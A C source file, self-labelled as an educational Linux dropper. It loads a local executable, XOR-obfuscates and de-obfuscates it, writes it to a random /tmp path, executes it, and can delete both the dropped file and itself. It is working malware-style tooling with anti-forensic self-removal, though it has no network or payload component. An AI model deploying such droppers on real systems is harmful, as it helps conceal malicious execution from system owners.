/*
    Linux Dropper (Educational)
    Author: Said (saidm7575)
    Year: 2025

    Description:
    This program reads a user-supplied executable file, applies a simple XOR obfuscation
    and de-obfuscation, saves it to a random path in /tmp, executes it, and optionally
    cleans up or deletes itself. All actions are logged to /tmp/downloader.log.

    Disclaimer:
    For educational and authorized testing purposes only.
    Do NOT use on systems you do not own or without explicit permission.
    The author assumes no liability for misuse.

    Usage:
        gcc dropper.c -o dropper
        ./dropper <input_file> [--cleanup] [--self-remove]
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <limits.h>
#include <libgen.h>

#define LOG_FILE "/tmp/downloader.log"
#define TMP_DIR "/tmp/"
#define MAX_FILE_SIZE (100 * 1024 * 1024) // 100MB limit
#define RANDOM_NAME_LEN 16
#define BUFFER_SIZE 8192

// Return codes for main()
typedef enum {
    SUCCESS = 0,
    ERR_ARGS = 1,
    ERR_INPUT = 2,
    ERR_SAVE = 3,
    ERR_EXEC = 4,
    ERR_MEMORY = 5
} exit_code_t;

// Structure to store program options/flags
typedef struct {
    char *input_file;
    int self_remove;
    int cleanup;
} options_t;

/*
    Log a formatted message with a timestamp to the log file.
    Includes log level (INFO, WARNING, ERROR).
*/
int log_message(const char *level, const char *fmt, ...) {
    FILE *log = fopen(LOG_FILE, "a");
    if (!log) {
        fprintf(stderr, "Warning: Cannot open log file: %s\n", strerror(errno));
        return -1;
    }

    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    if (!tm_info) {
        fclose(log);
        return -1;
    }

    char timebuf[32];
    if (strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", tm_info) == 0) {
        fclose(log);
        return -1;
    }

    fprintf(log, "[%s] [%s] PID:%d - ", timebuf, level, getpid());

    va_list args;
    va_start(args, fmt);
    vfprintf(log, fmt, args);
    va_end(args);

    fprintf(log, "\n");
    fclose(log);
    return 0;
}

/*
    Generate a random filename in /tmp/ using /dev/urandom.
    Output is placed in 'output', with length 'output_size'.
    Returns 0 on success, -1 on error.
*/
int generate_random_filename(char *output, size_t output_size) {
    if (!output || output_size < strlen(TMP_DIR) + RANDOM_NAME_LEN + 1) {
        return -1;
    }

    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0) {
        log_message("ERROR", "Cannot open /dev/urandom: %s", strerror(errno));
        return -1;
    }

    unsigned char random_bytes[RANDOM_NAME_LEN];
    ssize_t bytes_read = read(fd, random_bytes, sizeof(random_bytes));
    close(fd);

    if (bytes_read != sizeof(random_bytes)) {
        log_message("ERROR", "Failed to read random bytes");
        return -1;
    }

    strcpy(output, TMP_DIR);
    char *pos = output + strlen(TMP_DIR);

    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < RANDOM_NAME_LEN; i++) {
        pos[i] = charset[random_bytes[i] % (sizeof(charset) - 1)];
    }
    pos[RANDOM_NAME_LEN] = '\0';

    return 0;
}

/*
    Apply XOR obfuscation/deobfuscation to a memory buffer.
    Not secure—demonstration only.
*/
void xor_transform(unsigned char *data, size_t len, unsigned char key) {
    if (!data) return;
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

/*
    Save the buffer 'data' to 'filename' and make it executable.
    Returns 0 on success, -1 on failure.
*/
int save_executable_file(const char *filename, const unsigned char *data, size_t size) {
    if (!filename || !data || size == 0) {
        return -1;
    }

    int fd = open(filename, O_WRONLY | O_CREAT | O_EXCL, 0700);
    if (fd < 0) {
        log_message("ERROR", "Cannot create file %s: %s", filename, strerror(errno));
        return -1;
    }

    size_t total_written = 0;
    while (total_written < size) {
        ssize_t written = write(fd, data + total_written, size - total_written);
        if (written < 0) {
            if (errno == EINTR) continue;
            log_message("ERROR", "Write failed: %s", strerror(errno));
            close(fd);
            unlink(filename);
            return -1;
        }
        total_written += written;
    }

    if (fsync(fd) != 0) {
        log_message("WARNING", "fsync failed: %s", strerror(errno));
    }

    close(fd);

    log_message("INFO", "File saved as executable: %s (%zu bytes)", filename, size);
    return 0;
}

/*
    Execute the given file and wait for its completion.
    Returns the exit code or -1 on failure.
*/
int execute_file(const char *filename) {
    if (!filename) return -1;

    log_message("INFO", "Executing: %s", filename);

    pid_t pid = fork();
    if (pid == 0) {
        // Child process: close non-std file descriptors for safety
        for (int fd = 3; fd < 256; fd++) {
            close(fd);
        }
        execl(filename, filename, (char *)NULL);
        log_message("ERROR", "execl failed: %s", strerror(errno));
        _exit(127);
    } else if (pid < 0) {
        log_message("ERROR", "fork failed: %s", strerror(errno));
        return -1;
    }

    int status;
    pid_t result = waitpid(pid, &status, 0);
    if (result < 0) {
        log_message("ERROR", "waitpid failed: %s", strerror(errno));
        return -1;
    }

    if (WIFEXITED(status)) {
        int exit_code = WEXITSTATUS(status);
        log_message("INFO", "Process exited with code: %d", exit_code);
        return exit_code;
    } else if (WIFSIGNALED(status)) {
        int signal = WTERMSIG(status);
        log_message("WARNING", "Process terminated by signal: %d", signal);
        return 128 + signal;
    }

    return -1;
}

/*
    Remove (delete) the currently running executable from disk.
    Used if --self-remove is specified.
*/
void perform_self_removal(void) {
    char exe_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);

    if (len > 0) {
        exe_path[len] = '\0';
        log_message("WARNING", "Self-removing executable: %s", exe_path);

        if (unlink(exe_path) == 0) {
            log_message("INFO", "Self-removal successful");
        } else {
            log_message("ERROR", "Self-removal failed: %s", strerror(errno));
        }
    } else {
        log_message("ERROR", "Cannot determine executable path for self-removal");
    }
}

/*
    Parse command-line arguments.
    Sets options in the provided options_t struct.
    Returns 0 on success, -1 on error.
*/
int parse_arguments(int argc, char *argv[], options_t *opts) {
    if (!opts) return -1;

    memset(opts, 0, sizeof(options_t));

    if (argc < 2) {
        return -1;
    }

    opts->input_file = argv[1];

    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "--self-remove") == 0) {
            opts->self_remove = 1;
        } else if (strcmp(argv[i], "--cleanup") == 0) {
            opts->cleanup = 1;
        } else {
            log_message("WARNING", "Unknown option: %s", argv[i]);
        }
    }

    return 0;
}

/*
    Print usage/help text.
*/
void print_usage(const char *program_name) {
    printf("Usage: %s <input_file> [options]\n", program_name);
    printf("Options:\n");
    printf("  --cleanup      Remove output file after execution\n");
    printf("  --self-remove  Remove this program after completion (DANGEROUS)\n");
    printf("\nWARNING: This tool copies, obfuscates, and executes the provided file.\n");
    printf("Only use with files you trust.\n");
}

/*
    Main program entry point.
    - Parses arguments
    - Loads and obfuscates file
    - Drops and executes payload
    - Handles cleanup and self-removal
*/
int main(int argc, char *argv[]) {
    options_t opts;

    if (parse_arguments(argc, argv, &opts) != 0) {
        print_usage(argv[0]);
        return ERR_ARGS;
    }

    log_message("INFO", "Starting file launcher (PID: %d)", getpid());
    log_message("INFO", "Input file: %s", opts.input_file);

    // Open and read local file into memory
    size_t file_size = 0;
    unsigned char *file_data = NULL;
    FILE *fp = fopen(opts.input_file, "rb");
    if (!fp) {
        log_message("ERROR", "Cannot open input file: %s", strerror(errno));
        return ERR_INPUT;
    }
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    rewind(fp);

    if (fsize <= 0 || fsize > MAX_FILE_SIZE) {
        log_message("ERROR", "Invalid input file size: %ld bytes", fsize);
        fclose(fp);
        return ERR_INPUT;
    }

    file_data = malloc(fsize);
    if (!file_data) {
        log_message("ERROR", "Memory allocation failed");
        fclose(fp);
        return ERR_MEMORY;
    }

    if (fread(file_data, 1, fsize, fp) != (size_t)fsize) {
        log_message("ERROR", "File read failed");
        free(file_data);
        fclose(fp);
        return ERR_INPUT;
    }
    fclose(fp);

    file_size = fsize;
    log_message("INFO", "Successfully read %ld bytes from %s", fsize, opts.input_file);

    // Apply XOR obfuscation and de-obfuscation (for demonstration)
    const unsigned char xor_key = 0xAA;
    xor_transform(file_data, file_size, xor_key);
    log_message("INFO", "Applied transformation (key: 0x%02X)", xor_key);
    xor_transform(file_data, file_size, xor_key);
    log_message("INFO", "Reversed transformation");

    // Generate a random filename for the dropped payload
    char output_file[PATH_MAX];
    if (generate_random_filename(output_file, sizeof(output_file)) != 0) {
        log_message("ERROR", "Failed to generate random filename");
        free(file_data);
        return ERR_SAVE;
    }

    // Save the (deobfuscated) buffer as an executable file
    if (save_executable_file(output_file, file_data, file_size) != 0) {
        log_message("ERROR", "Failed to save executable file");
        free(file_data);
        return ERR_SAVE;
    }

    // Execute the dropped file
    int exec_status = execute_file(output_file);

    // Remove dropped file if requested
    if (opts.cleanup) {
        log_message("INFO", "Cleaning up: %s", output_file);
        if (unlink(output_file) != 0) {
            log_message("WARNING", "Failed to remove file: %s", strerror(errno));
        }
    }

    // Self-remove if requested
    if (opts.self_remove) {
        log_message("WARNING", "Self-removal requested");
        perform_self_removal();
    }

    free(file_data);
    log_message("INFO", "Task completed with status: %d", exec_status);

    return (exec_status == 0) ? SUCCESS : ERR_EXEC;
}

